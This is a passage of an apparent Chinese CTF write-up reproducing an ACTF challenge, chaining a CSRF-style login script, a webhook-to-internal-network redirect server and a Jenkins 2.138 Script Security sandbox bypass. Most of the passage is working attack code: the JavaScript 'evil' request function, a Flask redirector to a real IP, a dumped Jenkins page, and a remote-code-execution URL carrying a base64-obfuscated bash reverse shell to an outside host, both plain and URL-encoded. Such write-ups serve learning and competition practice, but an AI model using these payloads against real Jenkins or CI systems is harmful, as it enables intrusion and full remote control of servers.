class="string">'9aaf577e773320b3548fdc5f37aa6e74'</span></span><br><span class="line">});</span><br><span class="line"><span class="keyword">const</span> changshu = {</span><br><span class="line">    <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">    <span class="attr">headers</span>: {</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    },</span><br><span class="line">    <span class="attr">body</span>: loginreq,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">evil</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">const</span> loginrep = <span class="keyword">await</span> <span class="title function_">fetch</span>(login, changshu);</span><br><span class="line">        <span class="keyword">if</span> (loginrep.<span class="property">ok</span>) {</span><br><span class="line">            <span class="keyword">const</span> vipResponse = <span class="keyword">await</span> <span class="title function_">fetch</span>(vip, {</span><br><span class="line">                <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">                <span class="attr">headers</span>: {</span><br><span class="line">                    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">                },</span><br><span class="line">                <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>({ <span class="attr">code</span>: <span class="string">"awdawdwadwadwadwa"</span> }),</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">'include'</span>,</span><br><span class="line">            });</span><br><span class="line">            <span class="comment">// 在这里你可以处理vipResponse</span></span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// 在这里处理登录失败的情况</span></span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">catch</span> (error) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_">evil</span>();</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>现在，👴就是新世界の卡密.</p>
<h1 id="hooks"><span id="hooks"> hooks</span></h1>
<p><a target="_blank" rel="noopener" href="https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/">https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/</a></p>
<h2 id="what-is-webhook"><span id="what-is-webhook"> what is webhook🤔</span></h2>
<p>Webhook 是一种通过 HTTP 协议实现的回调机制，用于将实时事件和数据从一个应用程序传递到另一个应用程序。Webhook 允许应用程序在特定事件发生时自动通知其他应用程序，这种通知是通过 HTTP POST 请求进行的。它是一种用于实现实时通信和数据传递的轻量级机制。</p>
<p>以下是 Webhook 的主要特点和用途：</p>
<p>事件驱动通知： Webhook 主要用于事件驱动的通知，例如新的订单、新的消息、状态更改等。当特定事件发生时，源应用程序将发送 HTTP POST 请求到目标应用程序的 Webhook URL，通知目标应用程序进行响应。</p>
<p>实时性： Webhook 通常具有低延迟，因为它们是即时触发的。当事件发生时，通知立即发送，而不需要轮询或定期检查。</p>
<p>自动化： Webhook 允许自动化处理事件和数据，减少了手动干预的需要。这对于集成不同应用程序、自动化工作流程和提高效率非常有用。</p>
<p>扩展性： Webhook 可以与各种不同类型的应用程序和服务集成，使其具有很高的灵活性和扩展性。</p>
<p>数据传递： Webhook 可以传递各种数据格式，包括 JSON、XML、表单数据等，这使得它们适用于多种应用场景。</p>
<p>重点🤪:webhook 只允许我们发送 POST 请求，没法控制请求的 body, 甚至没有 csrf 的 token😓</p>
<h2 id="abusing-jenkins-login"><span id="abusing-jenkins-login"> Abusing Jenkins login</span></h2>
<p>不说人话:</p>
<p>Jenkins 是一个开源的自动化服务器，用于构建、测试和部署软件项目。它提供了一个灵活的平台，使团队能够自动化整个软件开发过程中的各种任务。以下是 Jenkins 的主要特点和用途：</p>
<p>持续集成 (CI) 和持续交付 (CD)： Jenkins 通过自动化构建和测试过程，支持持续集成和持续交付，使团队能够频繁地、可靠地交付软件。</p>
<p>插件生态系统： Jenkins 具有强大的插件生态系统，允许用户轻松地扩展其功能。有数千个可用的插件，用于与各种工具和技术进行集成。</p>
<p>分布式构建： Jenkins 支持分布式构建，可以将构建任务分发到多个构建代理 (Nodes)，以提高构建性能和可扩展性。</p>
<p>自动化部署： Jenkins 可以与各种部署工具和云平台集成，支持自动化部署到不同环境，包括开发、测试和生产环境。</p>
<p>可视化界面： Jenkins 提供直观的 Web 用户界面，用于管理构建任务、查看构建历史和生成报告。</p>
<p>多种构建工具支持： Jenkins 可以与各种构建工具集成，包括 Apache Ant、Maven、Gradle 等。</p>
<p>多语言支持： Jenkins 支持多种编程语言和技术栈，使其适用于各种项目。</p>
<p>安全性和权限控制： Jenkins 具有强大的安全性和权限控制功能，可以管理用户和角色的访问权限。</p>
<p>日志记录和报告： Jenkins 生成详细的构建日志和报告，以便诊断问题和追踪构建进度。</p>
<p>活跃的社区和支持： Jenkins 是一个开源项目，有一个活跃的社区，提供支持、文档和插件。</p>
<p>说人话:👴也不知道</p>
<p>一种绕过它们的方法，从登录页面开始。我们可以尝试暴力破解用户凭据，因为 Jenkins 用户在其自己的用户数据库中进行管理，或者使用其他缺乏基本保护（例如密码策略或针对自动化的保护）的用户管理方法，这是很常见的。(机翻，👴看不懂🐏文)</p>
<p>总而言之就是，通过 github 或 gitlab 的 webhooks 经过 python 中转，打到题目的内网.</p>
<p>👴真 tm 是个 sb, 看个文章没看全，把一部分 exp 拿去打，死活打不通，后来问⛰🌊giegie, 才知道要通过 python 写个重定向中转才能有回显，说是有视频演示，👴tm🐇了，没这么 sb 吧，阿米诺斯.</p>
<h2 id="开打"><span id="开打"> 开打😤</span></h2>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/evil'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evil</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"http://124.70.33.170:8088/redirect?redirect_url=http://jenkins:8080/"</span>,code=<span class="number">302</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">7777</span>)</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031084325.png" alt="微信截图_20231031084325"></p>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031081144.png" alt="微信截图_20231031081144"></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head resURL=<span class="string">"/static/e1c81722"</span> data-rooturl=<span class="string">""</span> data-resurl=<span class="string">"/static/e1c81722"</span>&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Dashboard [Jenkins]&lt;/title&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/css/layout-common.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/css/style.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/css/color.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/css/responsive-grid.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"/static/e1c81722/favicon.ico"</span> <span class="built_in">type</span>=<span class="string">"image/vnd.microsoft.icon"</span> /&gt;&lt;link color=<span class="string">"black"</span> rel=<span class="string">"mask-icon"</span> href=<span class="string">"/images/mask-icon.svg"</span> /&gt;&lt;script&gt;var isRunAsTest=false; var rootURL=<span class="string">""</span>; var resURL=<span class="string">"/static/e1c81722"</span>;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/prototype.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/behavior.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">'/adjuncts/e1c81722/org/kohsuke/stapler/bind.js'</span> <span class="built_in">type</span>=<span class="string">'text/javascript'</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/yahoo/yahoo-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/dom/dom-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/event/event-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/animation/animation-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/dragdrop/dragdrop-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/container/container-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/connection/connection-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/datasource/datasource-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/autocomplete/autocomplete-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/menu/menu-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/element/element-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/button/button-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/storage/storage-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/hudson-behavior.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/sortable.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;&lt;script&gt;crumb.init(<span class="string">""</span>, <span class="string">""</span>);&lt;/script&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/scripts/yui/container/assets/container.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/scripts/yui/assets/skins/sam/skin.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/scripts/yui/container/assets/skins/sam/container.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/scripts/yui/button/assets/skins/sam/button.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/scripts/yui/menu/assets/skins/sam/menu.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"search"</span> href=<span class="string">"/opensearch.xml"</span> <span class="built_in">type</span>=<span class="string">"application/opensearchdescription+xml"</span> title=<span class="string">"Jenkins"</span> /&gt;&lt;meta name=<span class="string">"ROBOTS"</span> content=<span class="string">"INDEX,NOFOLLOW"</span> /&gt;&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span> /&gt;&lt;link rel=<span class="string">"alternate"</span> href=<span class="string">"/rssAll"</span> title=<span class="string">"Jenkins:all (all builds)"</span> <span class="built_in">type</span>=<span class="string">"application/rss+xml"</span> /&gt;&lt;link rel=<span class="string">"alternate"</span> href=<span class="string">"/rssAll?flavor=rss20"</span> title=<span class="string">"Jenkins:all (all builds) (RSS 2.0)"</span> <span class="built_in">type</span>=<span class="string">"application/rss+xml"</span> /&gt;&lt;link rel=<span class="string">"alternate"</span> href=<span class="string">"/rssFailed"</span> title=<span class="string">"Jenkins:all (failed builds)"</span> <span class="built_in">type</span>=<span class="string">"application/rss+xml"</span> /&gt;&lt;link rel=<span class="string">"alternate"</span> href=<span class="string">"/rssFailed?flavor=rss20"</span> title=<span class="string">"Jenkins:all (failed builds) (RSS 2.0)"</span> <span class="built_in">type</span>=<span class="string">"application/rss+xml"</span> /&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/cookie/cookie-min.js"</span>&gt;&lt;/script&gt;&lt;script&gt;</span><br><span class="line">              YAHOO.util.Cookie.<span class="built_in">set</span>(<span class="string">"screenResolution"</span>, screen.width+<span class="string">"x"</span>+screen.height);</span><br><span class="line">            &lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/jsbundles/page-init.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;&lt;/head&gt;&lt;body data-model-<span class="built_in">type</span>=<span class="string">"hudson.model.AllView"</span> <span class="built_in">id</span>=<span class="string">"jenkins"</span> <span class="keyword">class</span>=<span class="string">"yui-skin-sam two-column jenkins-2.138"</span> data-version=<span class="string">"2.138"</span>&gt;&lt;a href=<span class="string">"#skip2content"</span> <span class="keyword">class</span>=<span class="string">"skiplink"</span>&gt;Skip to content&lt;/a&gt;&lt;div <span class="built_in">id</span>=<span class="string">"page-head"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"header"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"logo"</span>&gt;&lt;a <span class="built_in">id</span>=<span class="string">"jenkins-home-link"</span> href=<span class="string">"/"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/headshot.png"</span> alt=<span class="string">"[Jenkins]"</span> <span class="built_in">id</span>=<span class="string">"jenkins-head-icon"</span> /&gt;&lt;img src=<span class="string">"/static/e1c81722/images/title.png"</span> alt=<span class="string">"Jenkins"</span> width=<span class="string">"139"</span> <span class="built_in">id</span>=<span class="string">"jenkins-name-icon"</span> height=<span class="string">"34"</span> /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"login"</span>&gt; &lt;a href=<span class="string">"/login?from=%2F"</span>&gt;&lt;b&gt;log <span class="keyword">in</span>&lt;/b&gt;&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"searchbox hidden-xs"</span>&gt;&lt;form method=<span class="string">"get"</span> name=<span class="string">"search"</span> action=<span class="string">"/search/"</span> style=<span class="string">"position:relative;"</span> <span class="keyword">class</span>=<span class="string">"no-json"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"search-box-minWidth"</span>&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"search-box-sizer"</span>&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"searchform"</span>&gt;&lt;<span class="built_in">input</span> name=<span class="string">"q"</span> placeholder=<span class="string">"search"</span> <span class="built_in">id</span>=<span class="string">"search-box"</span> <span class="keyword">class</span>=<span class="string">"has-default-text"</span> /&gt; &lt;a href=<span class="string">"https://jenkins.io/redirect/search-box"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/16x16/help.png"</span> style=<span class="string">"width: 16px; height: 16px; "</span> <span class="keyword">class</span>=<span class="string">"icon-help icon-sm"</span> /&gt;&lt;/a&gt;&lt;div <span class="built_in">id</span>=<span class="string">"search-box-completion"</span>&gt;&lt;/div&gt;&lt;script&gt;createSearchBox(<span class="string">"/search/"</span>);&lt;/script&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"breadcrumbBar"</span>&gt;&lt;tr <span class="built_in">id</span>=<span class="string">"top-nav"</span>&gt;&lt;td <span class="built_in">id</span>=<span class="string">"left-top-nav"</span> colspan=<span class="string">"2"</span>&gt;&lt;link rel=<span class="string">'stylesheet'</span> href=<span class="string">'/adjuncts/e1c81722/lib/layout/breadcrumbs.css'</span> <span class="built_in">type</span>=<span class="string">'text/css'</span> /&gt;&lt;script src=<span class="string">'/adjuncts/e1c81722/lib/layout/breadcrumbs.js'</span> <span class="built_in">type</span>=<span class="string">'text/javascript'</span>&gt;&lt;/script&gt;&lt;div <span class="keyword">class</span>=<span class="string">"top-sticker noedge"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"top-sticker-inner"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"right-top-nav"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"right-top-nav"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"smallfont"</span>&gt;&lt;a href=<span class="string">"?auto_refresh=true"</span>&gt;ENABLE AUTO REFRESH&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul <span class="built_in">id</span>=<span class="string">"breadcrumbs"</span>&gt;&lt;li <span class="keyword">class</span>=<span class="string">"item"</span>&gt;&lt;a href=<span class="string">"/"</span> <span class="keyword">class</span>=<span class="string">"model-link inside"</span>&gt;Jenkins&lt;/a&gt;&lt;/li&gt;&lt;li href=<span class="string">"/"</span> <span class="keyword">class</span>=<span class="string">"children"</span>&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div <span class="built_in">id</span>=<span class="string">"breadcrumb-menu-target"</span>&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"page-body"</span> <span class="keyword">class</span>=<span class="string">"clear"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"side-panel"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"tasks"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"task"</span>&gt;&lt;a href=<span class="string">"/asynchPeople/"</span> <span class="keyword">class</span>=<span class="string">"task-icon-link"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/24x24/user.png"</span> style=<span class="string">"width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;"</span> <span class="keyword">class</span>=<span class="string">"icon-user icon-md"</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">"/asynchPeople/"</span> <span class="keyword">class</span>=<span class="string">"task-link"</span>&gt;People&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"task"</span>&gt;&lt;a href=<span class="string">"/view/all/builds"</span> <span class="keyword">class</span>=<span class="string">"task-icon-link"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/24x24/notepad.png"</span> style=<span class="string">"width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;"</span> <span class="keyword">class</span>=<span class="string">"icon-notepad icon-md"</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">"/view/all/builds"</span> <span class="keyword">class</span>=<span class="string">"task-link"</span>&gt;Build History&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"task"</span>&gt;&lt;a href=<span class="string">"/credentials"</span> <span class="keyword">class</span>=<span class="string">"task-icon-link"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/plugin/credentials/images/24x24/credentials.png"</span> style=<span class="string">"width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;"</span> <span class="keyword">class</span>=<span class="string">"icon-credentials-credentials icon-md"</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">"/credentials"</span> <span class="keyword">class</span>=<span class="string">"task-link"</span>&gt;Credentials&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"buildQueue"</span> <span class="keyword">class</span>=<span class="string">"container-fluid pane-frame track-mouse expanded"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"row"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"col-xs-24 pane-header"</span>&gt;&lt;a href=<span class="string">"/toggleCollapse?paneId=buildQueue"</span> title=<span class="string">"collapse"</span> <span class="keyword">class</span>=<span class="string">"collapse"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/16x16/collapse.png"</span> alt=<span class="string">"collapse"</span> style=<span class="string">"width: 16px; height: 16px; "</span> <span class="keyword">class</span>=<span class="string">"icon-collapse icon-sm"</span> /&gt;&lt;/a&gt;Build Queue&lt;/div&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"row pane-content"</span>&gt;&lt;table <span class="keyword">class</span>=<span class="string">"pane "</span>&gt;&lt;script src=<span class="string">'/adjuncts/e1c81722/lib/form/link/link.js'</span> <span class="built_in">type</span>=<span class="string">'text/javascript'</span>&gt;&lt;/script&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span> colspan=<span class="string">"2"</span>&gt;No builds <span class="keyword">in</span> the queue.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=<span class="string">"defer"</span>&gt;refreshPart(<span class="string">'buildQueue'</span>,<span class="string">"/ajaxBuildQueue"</span>);&lt;/script&gt;&lt;div <span class="built_in">id</span>=<span class="string">"executors"</span> <span class="keyword">class</span>=<span class="string">"container-fluid pane-frame track-mouse expanded"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"row"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"col-xs-24 pane-header"</span>&gt;&lt;a href=<span class="string">"/toggleCollapse?paneId=executors"</span> title=<span class="string">"collapse"</span> <span class="keyword">class</span>=<span class="string">"collapse"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/16x16/collapse.png"</span> alt=<span class="string">"collapse"</span> style=<span class="string">"width: 16px; height: 16px; "</span> <span class="keyword">class</span>=<span class="string">"icon-collapse icon-sm"</span> /&gt;&lt;/a&gt;&lt;a href=<span class="string">'/computer/'</span>&gt;Build Executor Status&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"row pane-content"</span>&gt;&lt;table <span class="keyword">class</span>=<span class="string">"pane "</span>&gt;&lt;colgroup&gt;&lt;col width=<span class="string">"30"</span> /&gt;&lt;col width=<span class="string">"200*"</span> /&gt;&lt;col width=<span class="string">"24"</span> /&gt;&lt;/colgroup&gt;&lt;tr&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span> align=<span class="string">"right"</span> style=<span class="string">"vertical-align: top"</span>&gt;<span class="number">1</span>&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;Idle&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span> align=<span class="string">"right"</span> style=<span class="string">"vertical-align: top"</span>&gt;<span class="number">2</span>&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;Idle&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=<span class="string">"defer"</span>&gt;refreshPart(<span class="string">'executors'</span>,<span class="string">"/ajaxExecutors"</span>);&lt;/script&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"main-panel"</span>&gt;&lt;a name=<span class="string">"skip</span></span><br></pre></td></tr></tbody></table></figure>
<p>看到 jenkins 版本为 2.138, 别问👴怎么看到的，你咋那么多事呢😡</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/15378440.html">https://www.cnblogs.com/cute-puli/p/15378440.html</a></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%<span class="number">20</span><span class="keyword">class</span>%20x%<span class="number">20</span>{public%20x(){%<span class="number">22</span>命令替换%<span class="number">22.</span>execute()}}</span><br></pre></td></tr></tbody></table></figure>
<p>打这个命令</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jenkins:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public <span class="keyword">class</span> <span class="title class_">x</span> {public x(){<span class="string">"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==}|{base64,-d}|{bash,-i}"</span>.execute()}}</span><br></pre></td></tr></tbody></table></figure>
<p>先把 value 的值 url 编码，然后把整个重定向网址 url 编码，</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jenkins:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=%<span class="number">70</span>%<span class="number">75</span>%<span class="number">62</span>%6c%<span class="number">69</span>%<span class="number">63</span>%<span class="number">20</span>%<span class="number">63</span>%6c%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">20</span>%<span class="number">78</span>%<span class="number">20</span>%7b%0a%<span class="number">20</span>%<span class="number">20</span>%<span class="number">70</span>%<span class="number">75</span>%<span class="number">62</span>%6c%<span class="number">69</span>%<span class="number">63</span>%<span class="number">20</span>%<span class="number">78</span>%<span class="number">28</span>%<span class="number">29</span>%7b%0a%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">22</span>%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">68</span>%<span class="number">20</span>%2d%<span class="number">63</span>%<span class="number">20</span>%7b%<span class="number">65</span>%<span class="number">63</span>%<span class="number">68</span>%6f%2c%<span class="number">59</span>%6d%<span class="number">46</span>%7a%<span class="number">61</span>%<span class="number">43</span>%<span class="number">41</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">53</span>%<span class="number">41</span>%2b%4a%<span class="number">69</span>%<span class="number">41</span>%<span class="number">76</span>%5a%<span class="number">47</span>%<span class="number">56</span>%<span class="number">32</span>%4c%<span class="number">33</span>%<span class="number">52</span>%6a%<span class="number">63</span>%<span class="number">43</span>%<span class="number">38</span>%<span class="number">30</span>%4d%<span class="number">79</span>%<span class="number">34</span>%<span class="number">78</span>%4e%<span class="number">44</span>%4d%<span class="number">75</span>%4d%<span class="number">54</span>%6b%<span class="number">79</span>%4c%6a%<span class="number">45</span>%<span class="number">35</span>%4c%7a%<span class="number">45</span>%<span class="number">78</span>%4e%<span class="number">44</span>%<span class="number">55</span>%<span class="number">67</span>%4d%<span class="number">44</span>%<span class="number">34</span>%6d%4d%<span class="number">51</span>%3d%3d%7d%7c%7b%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">36</span>%<span class="number">34</span>%2c%2d%<span class="number">64</span>%7d%7c%7b%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">68</span>%2c%2d%<span class="number">69</span>%7d%<span class="number">22</span>%2e%<span class="number">65</span>%<span class="number">78</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">28</span>%<span class="number">29</span>%0a%<span class="number">20</span>%<span class="number">20</span>%7d%0a%7d</span><br></pre></td></tr></tbody></table></figure>
